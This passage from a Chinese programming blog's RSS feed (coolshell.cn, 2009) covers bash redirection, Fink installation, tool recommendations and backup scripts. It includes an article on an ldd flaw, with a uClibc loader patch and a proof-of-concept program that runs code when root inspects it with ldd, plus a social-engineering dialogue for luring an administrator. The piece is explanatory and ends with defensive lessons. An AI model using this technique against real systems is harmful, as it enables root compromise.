<p>如果你问，我们是否可以覆盖函数级的重定向。答案是否定的。如果你试图这样做，那么，函数调用点的重定向会首先执行，然后函数定义上的重定向会将其覆盖。下面是一个示例：</p>
<p>[bash]#!/bin/bash</p>
<p>function mytest()<br>
{<br>
    echo hello world coolshell.cn<br>
} &gt;out1.txt<br>
mytest &gt;out2.txt[/bash]</p>
<p>运行结果是，out2.txt会被建立，但里面什么也没有。</p>
<p>下面是一个重定向标准输入的例子：</p>
<p>[bash]#!/bin/bash</p>
<p>function mytest()<br>
{<br>
    while read line<br>
    do<br>
        echo $line<br>
    done<br>
} &lt;&lt;EOF<br>
hello<br>
coolshell.cn<br>
EOF<br>
mytest[/bash]</p>
<p>下面是其运行结果：</p>
<p>[bash]$ bash mytest.sh<br>
hello<br>
coolshell.cn[/bash]</p>
<p>(全文完)</p>
 ]]></content>
<pubDate>2009-10-14T23:47:25+08:00</pubDate>
<guid>https://coolshell.cn/articles/1574.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一张关于操作系统的图 ]]></title>
<link>https://coolshell.cn/articles/1579.html</link>
<content><![CDATA[ 
<p>一图胜千言<img alt="image placeholder" ></p>
 ]]></content>
<pubDate>2009-10-15T10:44:53+08:00</pubDate>
<guid>https://coolshell.cn/articles/1579.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Bug 和 Icon 搜索引擎 ]]></title>
<link>https://coolshell.cn/articles/1582.html</link>
<content><![CDATA[ 
<p>以前给大家推荐过一个《<a rel="bookmark" href="https://coolshell.cn/articles/424.html">PDF电子书搜索引擎</a>》，现在再来推荐两个：</p>
<p>一个是开源项目的bug搜索引擎（当你想要选用某个开源软件的时候，或是你发现有一些异常的时候，你可以先去看看是否有一些相关的BUG）</p>
<p style="text-align: center;"><a href="http://bugspy.net/" target="_blank"><strong>http://bugspy.net/</strong></a></p>
<p style="text-align: center;"><a href="http://bugspy.net/" target="_blank"><img alt="image placeholder" ></a></p>
<p> </p>
<p>还有一个是图标的搜索引擎（那些ICON还是比较精美的，可以用来做UI的开发）</p>
<p style="text-align: center;"><a href="http://www.iconfinder.net/" target="_blank"><br>
<strong>http://www.iconfinder.net/<br>
</strong></a></p>
<p style="text-align: center;"><a href="http://www.iconfinder.net/" target="_blank"><br>
<img alt="image placeholder" ></a></p>
<p style="text-align: left;">(全文完)</p>
<p></p>
 ]]></content>
<pubDate>2009-10-15T10:55:02+08:00</pubDate>
<guid>https://coolshell.cn/articles/1582.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ [推荐]基于Mac的Port工具Fink ]]></title>
<link>https://coolshell.cn/articles/1592.html</link>
<content><![CDATA[ 
<p>看到标题，读者朋友们肯定第一时间想到的MacPort 。</p>
<p>恩，那是一款非常棒的工具。 不过我更愿意推荐各位使用另外一款工具 Fink(http://www.finkproject.org/).</p>
<blockquote><p>Fink 项目希望把 Unix 上各种<a href="http://www.opensource.org/">开放源码</a>软件带到 <a href="https://www.opensource.apple.com/">Darwin</a> 和 <a href="https://www.apple.com/macosx/">Mac OS X</a> 平台上。 我们通过修改 Unix 软件使得它可以在 Mac OS X 上编译和运行（“移植”）,并提供一个方便的分发系统使得每个人都可以下载和使用它。 Fink 使用 <a href="https://www.debian.org/">Debian</a> 中的象 dpkg 和 apt-get 等工具来提供强大的二进制软件包管理。 你可以随意选择是下载预编译好的二进制安装包或从源代码自己构建一切。</p></blockquote>
<p>关于 Fink的安装 ，大部分用户可参见http://www.finkproject.org/download/index.php?phpLang=zh。<br>
不过后面我主要想介绍我的安装方式，因为我的Mac 版本是10.6 64bit.所以还是有些差别。也许上述普通方法有效，但是我并未尝试。</p>
<p>安装步骤如下（感谢 <a href="http://sage.ucsc.edu/~wgscott/xtal/wiki/index.php/64-bit_Fink_for_10.6">http://sage.ucsc.edu/~wgscott/xtal/wiki/index.php/64-bit_Fink_for_10.6</a>）</p>
<p><span id="more-1592"></span></p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">cvs -d:pserver:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="37565958594e5a58424477515e595c1954414419445842455452515845505219595243">[email protected]</a>:/cvsroot/fink login
 #just hit return when prompted for password
cvs -z3 -d:pserver:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="3f5e5150514652504a4c7f59565154115c494c114c504a4d5c5a59504d585a11515a4b">[email protected]</a>:/cvsroot/fink co -P fink
cd fink
./bootstrap /sw
</pre>
<p>以上最后一步可能会花80%的时间，因为它会执行下载及编译这些很核心的工作。</p>
<p>完成之后编辑 <span style="font-family: monospace, 'Times New Roman', 'Bitstream Charter', Times, serif;line-height: 24px;font-size: 17px;color: #99cc00">/<span style="color: #fffbc6"><span style="color: #99cc00">sw/etc/fink.conf </span><span style="color: #000000;font-family: Georgia, 'Times New Roman', 'Bitstream Charter', Times, serif;line-height: 19px;font-size: 13px">第4行为：</span></span></span></p>
<p><span style="color: #ff6600;font-size: large"><span style="line-height: 24px"><span style="font-size: 12px"><strong><span style="color: #3366ff">Trees: local/main stable/main stable/crypto unstable/main unstable/crypto</span></strong></span></span></span></p>
<p>接下来就可以使用fink了。 fink的启动 我加了如下代码</p>
<p>[bash]source /sw/bin/init.sh<br>
fink selfupdate-cvs<br>
fink -y update-all<br>
fink scanpackages<br>
[/bash]</p>
<p>我建议 再执行一条</p>
<p>[bash]echo "source /sw/bin/init.sh" &gt;&gt; ~/.bash_profile[/bash]</p>
<p>这样新开终端进程的时候 就不用重新初始化fint了,完成以上步骤，就能使用fink了。</p>
<p>我之所以抛弃了macport 是因为他目前出现的和新版10.6的冲突问题，导致系统gcc库环境出现错误，而macport又与系统架构上不兼容 ，导致Port不能用 gcc 也不能用，而我又准备拿光盘重装developer环境的时候，光驱坏了 DVD盘一律不能读 :shame goodness…!<br>
fink的出现完全让我避开了以上问题，或许上述问题的出现有我个人原因。 但是fink有很重要的一点，就是它的源很快。他会自动推荐最适合我们的镜像。如果我们要随时更换fink的配置， 可以执行 <span style="color: #3366ff">fink configure.</span></p>
<p>我相信读到这里，会有不少习惯Port的朋友使用 Fink， Just do it, Fink和MacPort 同时存在并不是什么坏事，虽然我已经把MacPort彻底删了。</p>
 ]]></content>
<pubDate>2009-10-19T19:06:41+08:00</pubDate>
<guid>https://coolshell.cn/articles/1592.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Javascript的两本书 ]]></title>
<link>https://coolshell.cn/articles/1608.html</link>
<content><![CDATA[ 
<p>Definition Guide 和 The Good Part， 犀牛和蝴蝶，一厚一薄，事情不言而喻。</p>
<p><a href="https://coolshell.cn/wp-content/uploads/2009/10/javascript.jpg"><img alt="image placeholder" ></a></p>
 ]]></content>
<pubDate>2009-10-22T23:12:25+08:00</pubDate>
<guid>https://coolshell.cn/articles/1608.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Ajax开发利器UIzard ]]></title>
<link>https://coolshell.cn/articles/1611.html</link>
<content><![CDATA[ 
<p><a href="https://coolshell.cn/wp-content/uploads/2009/10/uizard2.jpg"></a>正如UIzard这个名字所暗示的，这是一个User Interface 的Wizard，从字面上理解，这是一个做界面的向导。这有什么奇怪的，Dreamwave之流已经是相当的成熟了，还能好得过它？是的，这个开源的项目，也许并没有那些商业软件那么成熟，不过，我想告诉你的是，这个开源软件绝对是值得我们重点关注的一个软件。</p>
<p>你可以理解为这是一个Web开发的IDE，不过其集成了Ajax方面的东西。这并不仅仅简单的是那种“所见即所得”的编辑器。而且，它也不信仅可以让那些非程序员非常简单地创建一个从前端到后端的Web应用，而且，他还可以让你连接数据库，创建非常复杂的布局和时间线，甚至于一些套件（白板，在线的类Word，Excel，PPT等功能），所有这些，你只需要简单的点几下按钮就可以了。真是相当的强大。（下面是个抓图）</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p><span id="more-1611"></span></p>
<p>看上去很不错吧，上面的的屏幕抓图展示了，你可以非常简单地嵌入一些Google的API。而且，你还可以设置RSS相关的功能，是的，源代码是很复杂的，但是有了这个工具，你所需要的就是用鼠标点来点去。</p>
<p>最NB的是，你不需要在你的硬盘上安装这个工具，你完全是一个基于Web的在线IDE，真是太强大了，这是我最最欣赏的地方，真是令人难以置信。</p>
<p>最后需要说的，这个工具的作者是一个韩国人，叫 Ryu Sungtae（韩国人的软件MS越来越猛了，比如那个著名的Kmplayer也是韩国人做的）， UIzard 由 Yahoo’ User Interface Library (YUI) 构造，这是一个基于Javascript 的用于创建各种交互式应用的程序库。虽然，目前的UIzard 只是Beta版，版本号还很新，0.9版，不过，这个项目的潜力是相当的大，值我们关注。</p>
<p>其官方站点是：<a href="http://www.uizard.org/" target="_blank">http://www.uizard.org/</a> </p>
<p>如果你想体验一下，那么，请你猛击下面的链接吧：（使用Fixfox效果更好）</p>
<p style="text-align: center;"><a href="http://www.uizard.org/UIzard/uizard.php" target="_blank">http://www.uizard.org/UIzard/uizard.php</a></p>
<p><a href="https://coolshell.cn/wp-content/uploads/2009/10/uizard1.jpg"><img alt="image placeholder" ></a></p>
<p>(全文完)</p>
 ]]></content>
<pubDate>2009-10-22T23:40:30+08:00</pubDate>
<guid>https://coolshell.cn/articles/1611.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Windows 7 的新粉丝 Linus Torvalds ]]></title>
<link>https://coolshell.cn/articles/1619.html</link>
<content><![CDATA[ 
<p>正当Windows 7 开始热卖的时候，正当广大北美用户抱怨Windows 7的销售价格，在东方要比西方便宜很多的时候。我们著名的Linus Torvalds来到了日本东京的一个软件商店里“庆祝Windows 7的Release”，难道他是去那里买一份便宜的Windows 7？</p>
<p style="text-align: center;"><a href="https://www.flickr.com/photos/offthebroiler/4036243510/sizes/o/" target="_blank"><img alt="image placeholder" ></a></p>
<p style="text-align: center;"><em>Linus Torvalds, 图片来自一个未经确认的 Yodobashi 商店， Tokyo, Japan. 来源: Jim Zemlin/The Linux Foundation (<strong>点击看大图</strong>)</em></p>
<p>这个图片目前还没有新闻报道，不过已有很多来源可以参考了……</p>
<p><span id="more-1619"></span></p>
<p>Linus在日本参加一个<a href="http://events.linuxfoundation.org/events/japan-linux-symposium"><strong>Japan Linux Symposium</strong></a>的座谈会，在一个Picaca的<a href="https://picasaweb.google.com/cschlaeger/JapanLinuxSymposium#5395400000458161906" target="_blank">链接</a>上说，Microsoft选择了和Japan Linux Symposium同一天，在座谈会的间隙，Linus和其同事想做点有趣的事情，于是他们来到了Windows 7的小商店里，当然，售货员同志并不知道这人是谁，而Linus一进店里马上就做了一个下蹲坚大拇指的手势，而他的同事很识相地马上就照了一张照片。呵呵，当然，他们什么也没有买。</p>
<p>而在一个据说是照片作者的 <a href="http://blogs.zdnet.com/perlow/?p=11403" target="_blank">BLOG</a> 上，博主也证实了相关的说法，说，这是Linus的一种幽默的态度，还说，Linus应该做一个V字型的手势而不是大拇指，这主要是Linus对东方文不了解。呵呵。</p>
<p>呵呵，很有意思吧。</p>
 ]]></content>
<pubDate>2009-10-23T14:21:50+08:00</pubDate>
<guid>https://coolshell.cn/articles/1619.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ ldd 的一个安全问题 ]]></title>
<link>https://coolshell.cn/articles/1626.html</link>
<content><![CDATA[ 
<p>我们知道“ldd”这个命令主要是被程序员或是管理员用来查看可执行文件所依赖的动态链接库的。是的，这就是这个命令的用处。可是，这个命令比你想像的要危险得多，也许很多黑客通过ldd的安全问题来攻击你的服务器。其实，ldd的安全问题存在很长的时间了，但居然没有被官方文档所记录来下，这听上去更加难以理解了。怎么？是不是听起来有点不可思议？下面，让我为你细细道来。</p>
<p>首先，我们先来了解一下，我们怎么来使用ldd的，请你看一下下面的几个命令：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">(1) $ ldd /bin/grep
        linux-gate.so.1 =&gt;  (0xffffe000)
        libc.so.6 =&gt; /lib/libc.so.6 (0xb7eca000)
        /lib/ld-linux.so.2 (0xb801e000)

(2) $ LD_TRACE_LOADED_OBJECTS=1 /bin/grep
        linux-gate.so.1 =&gt;  (0xffffe000)
        libc.so.6 =&gt; /lib/libc.so.6 (0xb7e30000)
        /lib/ld-linux.so.2 (0xb7f84000)

(3) $ LD_TRACE_LOADED_OBJECTS=1 /lib/ld-linux.so.2 /bin/grep
        linux-gate.so.1 =&gt;  (0xffffe000)
        libc.so.6 =&gt; /lib/libc.so.6 (0xb7f7c000)
        /lib/ld-linux.so.2 (0xb80d0000)</pre>
<p>第(1)个命令，我们运行了 `ldd` 于 `/bin/grep`。我们可以看到命令的输出是我们想要的，那就是 `/bin/grep` 所依赖的动态链接库。</p>
<p>第(2)个命令设置了一个叫 LD_TRACE_LOADED_OBJECTS 的环境变量，然后就好像在运行命令 `/bin/grep` (但其实并不是)。 其运行结果和ldd的输出是一样的！</p>
<p>第(3)个命令也是设置了环境变量 LD_TRACE_LOADED_OBJECTS ，然后调用了动态链接库 `ld-linux.so` 并把 `/bin/grep` 作为参数传给它。我们发现，其输出结果还是和前面两个一样的。</p>
<p><span id="more-1626"></span></p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E5%85%B7%E4%BD%93%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F" title="具体发生了什么？">具体发生了什么？</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%BC%96%E8%AF%91%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E8%A3%85%E8%BD%BD%E5%99%A8" title="编译一个新的装载器">编译一个新的装载器</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%B0%8F%E8%AF%95_%E7%89%9B%E5%88%80" title="小试 牛刀">小试 牛刀</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E9%82%AA%E6%81%B6%E7%9A%84%E7%A8%8B%E5%BA%8F" title="邪恶的程序">邪恶的程序</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E9%82%AA%E6%81%B6%E7%9A%84%E7%94%B5%E8%AF%9D" title="邪恶的电话">邪恶的电话</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E5%85%B7%E4%BD%93%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F"></span>具体发生了什么？<span class="ez-toc-section-end"></span>
</h4>
<p>对于第二个和第三个命令来说，好像是对 `ldd` 的一个包装或是一个隐式调用。对于第二个和第三个命令来说， `/bin/grep` 这个命令就根本没有被运行。这是一个GNU动态载入器的怪异的特性。如果其注意到环境变量LD_TRACE_LOADED_OBJECTS 被设置了，那么它就不会去执行那个可运行的程序，而去输出这个可执行程序所依赖的动态链接库 （在BSD 系统上的`ldd` 是一个C 程序)。</p>
<p>如果你使用的是Linux，那么，你可以去看看 `ldd` 程序，你会发现这是一个 bash 的脚本。如果你仔细查看这个脚本的源码，你会发现，第二个命令和第三个命令的差别就在于 `ld-linux.so` 装载器是否可以被`ldd`所装载，如果不能，那就是第二个命令，如果而的话，那就是第三个命令。</p>
<p>所以，如果我们可以让`ld-linux.so` 装载器失效的话，或是让别的装载器来取代这个系统默认的动态链接库的话，那么我们就可以让 `ldd`来载入并运行我们想要程序了——使用不同的载装器并且不处理LD_TRACE_LOADED_OBJECTS 环境变量，而是直接运行程序。</p>
<p>例如，你可以创建一个具有恶意的程序，如： ~/app/bin/exec 并且使用他自己的装载器 ~/app/lib/loader.so。如果某人（比如超级用户root） 运行了 `ldd /home/you/app/bin/exec` ，于是，他就玩完了。因为，那并不会列出所依赖的动态链接库，而是，直接执行你的那个恶意程序，这相当于，那个用户给了你他的授权。</p>
<h4>
<span class="ez-toc-section" id="%E7%BC%96%E8%AF%91%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84%E8%A3%85%E8%BD%BD%E5%99%A8"></span>编译一个新的装载器<span class="ez-toc-section-end"></span>
</h4>
<p>下载 <a href="https://www.uclibc.org/">uClibc</a> C库。这是一个相当漂亮的代码，并且可以非常容易地修改一下源代码，使其忽略LD_TRACE_LOADED_OBJECTS 检查。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ mkdir app
$ cd app
app$ wget 'http://www.uclibc.org/downloads/uClibc-0.9.30.1.tar.bz2'</pre>
<p>解压这个包，并执行 `make menuconfig`，选项你的平台架构（比如：i386），剩下的事情保持不变。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ bunzip2 &lt; uClibc-0.9.30.1.tar.bz2 | tar -vx
$ rm -rf uClibc-0.9.30.1.tar.bz2
$ cd uClibc-0.9.30.1
$ make menuconfig</pre>
<p>编辑 .config 并设置目标安装目录：到 `/home/you/app/uclibc`，<br>
把下面两行</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">RUNTIME_PREFIX="/usr/$(TARGET_ARCH)-linux-uclibc/"
DEVEL_PREFIX="/usr/$(TARGET_ARCH)-linux-uclibc/usr/"</pre>
<p>改成</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">RUNTIME_PREFIX="/home/you/app/uclibc/"
DEVEL_PREFIX="/home/you/app/uclibc/usr/"</pre>
<p>现在你需要改动一下其源代码，让其忽略LD_TRACE_LOADED_OBJECTS 环境变量的检查。 下面是个这修改的diff，你需要修改的是 `ldso/ldso/ldso.c` 文件。你可把下面的这个diff存成一个叫file的文件，然后运行这个命令：`patch -p0 &lt; file`。如果你不这样做的话，那么，我们的黑客程序就无法工作，而我们的这个装载器还是会认为 `ldd` 想列出动态链接库的文件列表。</p>
<p>[patch]<br>
— ldso/ldso/ldso-orig.c 2009-10-25 00:27:12.000000000 +0300<br>
+++ ldso/ldso/ldso.c 2009-10-25 00:27:22.000000000 +0300<br>
@@ -404,9 +404,11 @@<br>
} #endif<br>
+ /*<br>
if (_dl_getenv("LD_TRACE_LOADED_OBJECTS", envp) != NULL) {<br>
trace_loaded_objects++;<br>
}<br>
+ */<br>
#ifndef __LDSO_LDD_SUPPORT__<br>
if (trace_loaded_objects) {<br>
[/patch]</p>
<p>下面让我们来编译并安装它。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ make -j 4
$ make install</pre>
<p>于是，我们的 uClibc 装载器就被安装了，并且libc 库指向了 /home/you/app/uclibc. 就这么简单，现在，我们需要做的就是把我们的uClibc的装载器 (app/lib/ld-uClibc.so.0)变成默认的。</p>
<h4>
<span class="ez-toc-section" id="%E5%B0%8F%E8%AF%95_%E7%89%9B%E5%88%80"></span>小试 牛刀<span class="ez-toc-section-end"></span>
</h4>
<p>首先，先让我们来创建一个测试程序，这人程序也就是输出些自己的东西，这样可以让我们看到我们的程序被执行了。我们把这个程序放在 `app/bin/`下，叫“myapp.c”，下面是源代码</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main() {
  if (getenv("LD_TRACE_LOADED_OBJECTS")) {
    printf("All your things are belong to me.\n");
  }
  else {
    printf("Nothing.\n");
  }
  return 0;
}</pre>
<p>这是一个很简单的代码了，这段代码主要检查一下环境变量LD_TRACE_LOADED_OBJECTS 是否被设置了，如果是，那么恶意程序执行，如果没有，那么程序什么也不发生。</p>
<p>下面是编译程序的命令，，大家可以看到，我们静态链接了一些函数库。我们并不想让LD_LIBRARY_PATH这个变量来发挥作用。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ L=/home/you/app/uclibc
$ gcc -Wl,--dynamic-linker,$L/lib/ld-uClibc.so.0 \
    -Wl,-rpath-link,$L/lib \
    -nostdlib \
    myapp.c -o myapp \
    $L/usr/lib/crt*.o \
    -L$L/usr/lib/ \
    -lc</pre>
<p>下面是GCC的各个参数的解释：</p>
<ul>
<li>
<strong>-Wl,–dynamic-linker,$L/lib/ld-uClibc.so.0</strong> — 指定一个新的装载器。</li>
<li>
<strong>-Wl,-rpath-link,$L/lib</strong> — 指定一个首要的动态装载器所在的目录，这个目录用于查找动态库。</li>
<li>
<strong>-nostdlib</strong> — 不使用系统标准库。</li>
<li>
<strong>myapp.c -o myapp</strong> — 编译myapp.c 成可执行文件 myapp,</li>
<li>
<strong>$L/usr/lib/crt*.o</strong> — 静态链接runtime 代码</li>
<li>
<strong>-L$L/usr/lib/</strong> — libc 的目录（静态链接）</li>
<li>
<strong>-lc</strong> —  C 库</li>
</ul>
<p>现在让我们来运行一下我们的 `myapp` （没有ldd，一切正常）</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">app/bin$ ./myapp
Nothing.</pre>
<p>LD_TRACE_LOADED_OBJECTS 没有设置，所以输出 “Nothing” 。</p>
<p>现在，让我们来使用 `ldd` 来看看这个程序的最大的影响力，让我们以root身份来干这个事。</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">$ su
Password:
# ldd ./myapp
All your things are belong to me.</pre>
<p>哈哈，我们可以看到，ldd触发了我们的恶意代码。于是，我们偷了整个系统！</p>
<h4>
<span class="ez-toc-section" id="%E9%82%AA%E6%81%B6%E7%9A%84%E7%A8%8B%E5%BA%8F"></span>邪恶的程序<span class="ez-toc-section-end"></span>
</h4>
<p>下面这个例子更为实际一些，如果没有`ldd` ，那程序程序会报错 “error while loading shared libraries” ，这个错误信息会引诱你去去使用 `ldd` 去做检查，如果你是root的话，那么就整个系统就玩完了。而当你可以了 `ldd` 后，它会在干完坏事后，模仿正确的`ldd`的输出，告诉你 `libat.so.0` 不存在。</p>
<p>下面的代码仅仅是向你展示了一下整个想法，代码还需加工和改善。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/types.h&gt;

/*
This example pretends to have a fictitious library 'libat.so.0' missing.
When someone with root permissions runs `ldd this_program`, it does
something nasty in malicious() function.

I haven't implemented anything malicious but have written down some ideas
of what could be done.

This is, of course, a joke program. To make it look more real, you'd have
to bump its size, add some more dependencies, simulate trying to open the
missing library, detect if ran under debugger or strace and do absolutely
nothing suspicious, etc.
*/

void pretend_as_ldd()
{
    printf("\tlinux-gate.so.1 =&gt;  (0xffffe000)\n");
    printf("\tlibat.so.0 =&gt; not found\n");
    printf("\tlibc.so.6 =&gt; /lib/libc.so.6 (0xb7ec3000)\n");
    printf("\t/lib/ld-linux.so.2 (0xb8017000)\n");
}

void malicious()
{
    if (geteuid() == 0) {
        /* we are root ... */
        printf("poof, all your box are belong to us\n");

        /* silently add a new user to /etc/passwd, */
        /* or create a suid=0 program that you can later execute, */
        /* or do something really nasty */
    }
}

int main(int argc, char **argv)
{
    if (getenv("LD_TRACE_LOADED_OBJECTS")) {
        malicious();
        pretend_as_ldd();
        return 0;
    }

    printf("%s: error while loading shared libraries: libat.so.0: "
           "cannot open shared object file: No such file or directory\n",
           argv[0]);
    return 127;
}</pre>
<p> </p>
<h4>
<span class="ez-toc-section" id="%E9%82%AA%E6%81%B6%E7%9A%84%E7%94%B5%E8%AF%9D"></span>邪恶的电话<span class="ez-toc-section-end"></span>
</h4>
<p>事实上来说，上面的那段程序可能的影响更具破坏性，因为大多数的系统管理员可能并不知道不能使用 `ldd` 去测试那些不熟悉的执行文件。下面是一段很可能会发现的对话，让我们看看我们的程序是如何更快地获得系统管理员的权限的。</p>
<p>系统管理员的电话狂响……</p>
<p>系统管理员： “同志你好，我是系统管理员，有什么可以帮你的？”</p>
<p>黑客：“管理员同志你好。我有一个程序不能运行，总是报错，错误好像是说一个系统动态链接库有问题，你能不能帮我看看？”</p>
<p>系统管理员：“没问题，你的那个程序在哪里？”</p>
<p>黑客： “在我的home目录下，/home/hchen/app/bin/myapp”。</p>
<p>系统管理员：“ OK，等一会儿”，黑客在电话这头可以听到一些键盘的敲击声。</p>
<p>系统管理员：“好像是动态链接库的问题，你能告诉我你的程序具体需要什么样的动态链接库吗？”</p>
<p>黑客说: “谢谢，应该没有别的嘛。”</p>
<p>系统管理员：“嗯，查到了，说是没有了 `libat.so.0`这是你自己的动态链接库吗？”</p>
<p>黑客说：“哦，好像是的，你等一下，我看看……” 黑客在那头露出了邪恶的笑，并且，讯速地输入了下面的命令：</p>
<p style="padding-left: 30px;">`mv ~/.hidden/working_app ~/app/bin/myapp`<br>
`mv ~/.hidden/libat.so.o ~/app/bin/`</p>
<p>黑客说：“哦，对了，的确是我的不对，我忘了把这个链接库拷过来了，现在应该可以了，谢谢你啊，真是不好意思，麻烦你了”</p>
<p>系统管理员： “没事就行了，下次注意啊！”（然后系统管理心里暗骂，TMD，又一个白痴用户！……）</p>
<p><strong>教训一：千万不要使用 `ldd` 去测试你不知道的文件！<br>
教训二：千万不要相信陌生人！</strong></p>
<p>文章：<a href="http://www.catonmat.net/blog/ldd-arbitrary-code-execution/" target="_blank">来源</a>（以上文章并非完全翻译，我做过一些修改，所以，如果你要转载，请注明作者和出处）</p>
 ]]></content>
<pubDate>2009-10-28T00:15:46+08:00</pubDate>
<guid>https://coolshell.cn/articles/1626.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 文件备份的几个简单命令 ]]></title>
<link>https://coolshell.cn/articles/1640.html</link>
<content><![CDATA[ 
<p>我们知道，备份文件是一件很重要的事情，我在《<a rel="bookmark" href="https://coolshell.cn/articles/222.html">优秀程序员的十个习惯</a>》一文向大家说明了备份文件应该是程序员最基本的一个习惯。本文主要是向大家介绍一些在备份文件和数据时能用得到的一些示例，当然，这些示例主要是通过一些命令行或是脚本来实现的。这就是用命令行和脚本的优势，你可以实现比较灵活和自动的定制。</p>
<p>本文中的脚本和示例都是主要是通过zip, tar, ftp, wget和shell脚本来完成。在Linux下，你可以什么也不用安装任何程序，但在Windows下，你需要安装zip 和wget这三个命令（在本文的最后有这三个命令的链接，你可以去下载）</p>
<h4>几个小脚本</h4>
<p><strong>1）首先，我们来看一下，如何给某目录打个zip包。</strong></p>
<p><strong>Windows</strong>:</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW"> zip -r backup.zip "c:\yourfolder"</code></p>
<p><strong>Linux</strong>: (打包自己的home目录)</p>
<p><code data-enlighter-language="shell" class="EnlighterJSRAW">tar -czvf ~/backup.tgz --exclude backup.tgz ~/</code></p>
<p><span id="more-1640"></span><br>
<strong>2）接下来，我们再来看一下，创建一个带有时间文件名的压缩包，并上传到远程主机的一个例子。</strong></p>
<p> <strong>Windows</strong></p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">  :: cmd 脚本
  :: 压缩包文件格式`backup-mm-dd-yyyy.zip'
  :: 注意：%dir% 被引号括起是怕目录名中有空格

  @echo off

  set host=ftp.yourhost.com
  set user=username
  set pass=password
  set file=backup-%date:~4,2%-%date:~7,2%-%date:~10%.zip
  set dir="yourfolder"

  zip -r %file% %dir%

  &gt;  script.ftp echo open %host%
  &gt;&gt; script.ftp echo %user%
  &gt;&gt; script.ftp echo %pass%
  &gt;&gt; script.ftp echo bin
  &gt;&gt; script.ftp echo put %file%
  &gt;&gt; script.ftp echo bye

  ftp.exe -d -s:script.ftp &gt; backup.log

  del script.ftp
</pre>
<p><strong>Linux</strong></p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">  #!/bin/bash

  host="ftp.yoursite.com"
  user="username"
  pass="password"
  file="backup-$(date '+%m-%d-%Y').tgz"
  dir="$HOME"

  tar -cvzf $file $dir

  ftp -vin &lt;ftp.log
  open $host
  user $user $pass
  bin
  put $file
  close
  bye
  EOF
</pre>
<p><strong>3）最后，我们来看一看，通过wget命令来下载备份好的压缩包。</strong></p>
<p><strong>Windows</strong></p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">  :: cmd 脚本
  :: 注意： '^' 是一个命令的换行符

  set host="ftp://ftp.your.host.com"
  set user="flintstone"
  set pass="yabbadabbadoo"

  wget %host% --ftp-user=%user% --ftp-password=%pass% ^ 
      --mirror --output-file=backup.log --passive-ftp
</pre>
<p><strong>Linux</strong></p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">  #!/bin/sh
  # 注意 '\' 是命令的换行符
  
  host="ftp://ftp.your.host.com"
  user="username"
  pass="password"

  wget $host --ftp-user=$user --ftp-password=$pass \
  --mirror --output-file=backup.log --passive-ftp
</pre>
<h4>相关工具</h4>
<ul>
<li>Info-Zip: <a href="http://www.info-zip.org/">http://www.info-zip.org/</a>
</li>
<li>GNU Tar: <a href="https://www.gnu.org/software/tar/">http://www.gnu.org/software/tar/</a>
</li>
<li>GNU Wget: <a href="https://www.gnu.org/software/wget/">http://www.gnu.org/software/wget/</a>
</li>
</ul>
<h4>几点注意</h4>
<p>上面的那几个命令比较简单，只是表明一些备份的脚本思路。在实际过程当中，基本上也是这样，下面是几点注意。</p>
<p>1）给备份文件打包压缩这是第一步，你可以选用其它的压缩程序。如bzip。<br>
